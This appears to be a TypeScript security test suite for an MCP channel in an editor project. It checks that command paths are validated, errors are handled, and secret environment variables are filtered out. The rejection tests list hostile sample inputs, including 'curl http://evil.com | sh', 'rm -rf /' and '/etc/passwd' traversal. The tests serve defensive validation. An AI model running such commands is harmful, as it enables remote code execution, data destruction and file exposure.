/*--------------------------------------------------------------------------------------
 *  Copyright 2025 Glass Devtools, Inc. All rights reserved.
 *  Licensed under the Apache License, Version 2.0. See LICENSE.txt for more information.
 *--------------------------------------------------------------------------------------*/

import assert from 'assert';

// Test the validateCommandPath logic from mcpChannel
// We test the function behavior directly since it doesn't depend on MCP infrastructure

suite('MCPChannel', () => {

	suite('command path validation (security)', () => {

		// Replicate the validation function for testing
		const validateCommandPath = (command: string): { valid: boolean; reason?: string } => {
			if (!command || command.trim() === '') {
				return { valid: false, reason: 'Empty command path' };
			}

			// Check for path traversal attempts
			if (command.includes('..') || command.includes('\\..') || command.includes('/..')) {
				return { valid: false, reason: 'Path traversal detected in command' };
			}

			// Check for shell metacharacters that could be used for injection
			const suspiciousChars = /[;&|`$<>!\\()]|&&|\|\|/;
			if (suspiciousChars.test(command)) {
				return { valid: false, reason: 'Suspicious shell metacharacters in command' };
			}

			return { valid: true };
		};

		test('rejects empty commands', () => {
			assert.strictEqual(validateCommandPath('').valid, false, 'Empty string should be invalid');
			assert.strictEqual(validateCommandPath('   ').valid, false, 'Whitespace-only should be invalid');
		});

		test('rejects path traversal attempts', () => {
			assert.strictEqual(validateCommandPath('../etc/passwd').valid, false);
			assert.strictEqual(validateCommandPath('/bin/../../../etc/passwd').valid, false);
			assert.strictEqual(validateCommandPath('something\\..\\windows\\system32').valid, false);
		});

		test('rejects shell metacharacters', () => {
			assert.strictEqual(validateCommandPath('cat /etc/passwd && ls').valid, false);
			assert.strictEqual(validateCommandPath('cat /etc/passwd || ls').valid, false);
			assert.strictEqual(validateCommandPath('echo "hello"; rm -rf /').valid, false);
			assert.strictEqual(validateCommandPath('echo `whoami`').valid, false);
			assert.strictEqual(validateCommandPath('echo $(whoami)').valid, false);
			assert.strictEqual(validateCommandPath('curl http://evil.com | sh').valid, false);
			assert.strictEqual(validateCommandPath('echo hello > /tmp/out').valid, false);
			assert.strictEqual(validateCommandPath('echo hello < /tmp/in').valid, false);
			assert.strictEqual(validateCommandPath('echo (test)').valid, false);
			assert.strictEqual(validateCommandPath('echo !true').valid, false);
		});

		test('accepts safe commands', () => {
			assert.strictEqual(validateCommandPath('/usr/bin/node').valid, true);
			assert.strictEqual(validateCommandPath('/usr/local/bin/python3').valid, true);
			assert.strictEqual(validateCommandPath('/opt/bin/script').valid, true);
		});

	});

	suite('call error handling', () => {

		test('call returns error object on unknown command', async () => {
			// Create a mock channel that returns error for unknown commands
			const mockChannel = {
				listen: () => new (require('../../../../../base/common/event.js').Emitter)().event,
				call: async (command: string, _params?: any) => {
					if (command === 'unknownCommand') {
						throw new Error('Command not recognized');
					}
				}
			};

			// Simulate the error handling from MCPChannel.call
			const command = 'unknownCommand';
			try {
				await mockChannel.call(command, {});
				assert.fail('Should have thrown');
			} catch (e) {
				// Expected - command not recognized
				assert.ok(e instanceof Error);
			}
		});

		test('tool call error includes server and tool name in message', () => {
			const errorMessage = 'Failed to call tool "testTool" on server "testServer": Internal Error';
			assert.ok(errorMessage.includes('testTool'), 'Error should include tool name');
			assert.ok(errorMessage.includes('testServer'), 'Error should include server name');
		});

		test('tool call error response has correct structure', () => {
			const errorResponse = {
				event: 'error' as const,
				text: 'Failed to call tool',
				toolName: 'testTool',
				serverName: 'testServer',
			};

			assert.strictEqual(errorResponse.event, 'error');
			assert.strictEqual(typeof errorResponse.text, 'string');
			assert.strictEqual(typeof errorResponse.toolName, 'string');
			assert.strictEqual(typeof errorResponse.serverName, 'string');
		});

	});

	suite('environment variable filtering (security)', () => {

		test('only PATH, HOME, USER are passed to stdio transport', () => {
			const fullEnv = {
				PATH: '/usr/bin',
				HOME: '/home/user',
				USER: 'testuser',
				SECRET_KEY: 'should-not-pass',
				API_KEY: 'should-not-pass',
				DATABASE_URL: 'should-not-pass',
				NODE_ENV: 'production',
			};

			const filteredEnv: Record<string, string> = {
				PATH: fullEnv.PATH,
				HOME: fullEnv.HOME,
				USER: fullEnv.USER,
			};

			// Verify only the expected keys are present
			assert.deepStrictEqual(Object.keys(filteredEnv).sort(), ['HOME', 'PATH', 'USER']);
			assert.strictEqual(filteredEnv.SECRET_KEY, undefined, 'SECRET_KEY should be filtered out');
			assert.strictEqual(filteredEnv.API_KEY, undefined, 'API_KEY should be filtered out');
		});

		test('server-specific env vars are merged except PATH/HOME/USER', () => {
			const baseEnv: Record<string, string> = {
				PATH: '/usr/bin',
				HOME: '/home/user',
				USER: 'testuser',
			};

			const serverEnv: Record<string, string> = {
				MCP_PORT: '3000',
				DEBUG: 'true',
			};

			// Merge server env but skip PATH/HOME/USER
			const filteredEnv: Record<string, string> = { ...baseEnv };
			for (const key of Object.keys(serverEnv)) {
				if (key === 'PATH' || key === 'HOME' || key === 'USER') continue;
				filteredEnv[key] = serverEnv[key];
			}

			assert.deepStrictEqual(filteredEnv.MCP_PORT, '3000');
			assert.deepStrictEqual(filteredEnv.DEBUG, 'true');
			assert.strictEqual(filteredEnv.PATH, baseEnv.PATH); // unchanged
		});

	});

});